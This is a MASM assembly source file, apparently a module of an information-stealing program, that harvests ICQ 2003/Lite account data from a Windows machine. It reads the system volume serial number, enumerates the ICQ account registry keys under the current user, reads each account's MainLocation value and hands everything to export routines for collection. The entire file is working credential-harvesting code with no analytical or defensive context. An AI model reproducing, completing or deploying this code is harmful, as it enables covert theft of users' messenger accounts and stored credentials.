; ICQ2003+/Lite
; Tested on:
;	ICQ Lite 4.0

.data
	@AllocStr <szICQ2003BasePath>, 	<"SOFTWARE\Mirabilis\ICQ\NewOwners">
	@AllocStr <szMainLocation>, 	<"MainLocation">
	@AllocMem <lpICQ2003CommonBuf>, <MAX_PATH+1> 

.code

; Get MainLocation value
GetMainLocation proc lpszRegKeyPath: DWORD
	LOCAL	lpOutBuf[16]: BYTE
	LOCAL	hkHandle, BufSize, DataType: DWORD

	invoke  RegOpenKey, HKEY_CURRENT_USER, lpszRegKeyPath, addr hkHandle

	mov     BufSize, 16
	invoke  RegQueryValueEx, hkHandle, offset szMainLocation, NULL, addr DataType, addr lpOutBuf, addr BufSize
	.IF	!eax
		invoke	ExportStr, TYPE_ICQ_2003_UIN, SUBTYPE_ICQ_2003_STR, offset lpICQ2003CommonBuf[szICQ2003BasePathLen+1]
		invoke	ExportData, TYPE_ICQ_2003_UIN, SUBTYPE_ICQ_2003_DATA, addr lpOutBuf, BufSize        	
	.ENDIF

	invoke	RegCloseKey, hkHandle	
	ret
GetMainLocation endp

GetICQ2003Output proc
	LOCAL	hkHandle, dwSerial, KeyIndex: DWORD

	; Write header	
	invoke	ExportModule, MODULE_ICQ_2003
	
	; Get HDD serial
	invoke	GetWindowsDirectory, offset lpICQ2003CommonBuf, MAX_PATH
	
	xor	ecx, ecx
	mov	byte ptr lpICQ2003CommonBuf[3], cl
	invoke	GetVolumeInformation, offset lpICQ2003CommonBuf, ecx, ecx, addr dwSerial, ecx, ecx, ecx, ecx
	invoke	ExportData, TYPE_ICQ_2003_SERIAL, 0, addr dwSerial, 4
	
	invoke  RegOpenKey, HKEY_CURRENT_USER, offset szICQ2003BasePath, addr hkHandle
	test	eax, eax
	jnz	@ret
	
	; Enum registry entries
	mov	KeyIndex, 0
@enum:
	mov     dwSerial, 20
	xor	eax, eax
	invoke  RegEnumKeyEx, hkHandle, KeyIndex, offset lpICQ2003CommonBuf[szICQ2003BasePathLen+1], addr dwSerial, eax, eax, eax, eax
	test	eax, eax
	jnz	@enum_end

	; Make the path
	invoke	lstrcpy, offset lpICQ2003CommonBuf, offset szICQ2003BasePath
	mov	byte ptr lpICQ2003CommonBuf[szICQ2003BasePathLen], '\'
	invoke	GetMainLocation, offset lpICQ2003CommonBuf

	inc	KeyIndex
	jmp	@enum
	
@enum_end:	
	invoke	RegCloseKey, hkHandle
	
@ret:	 
	ret
GetICQ2003Output endp
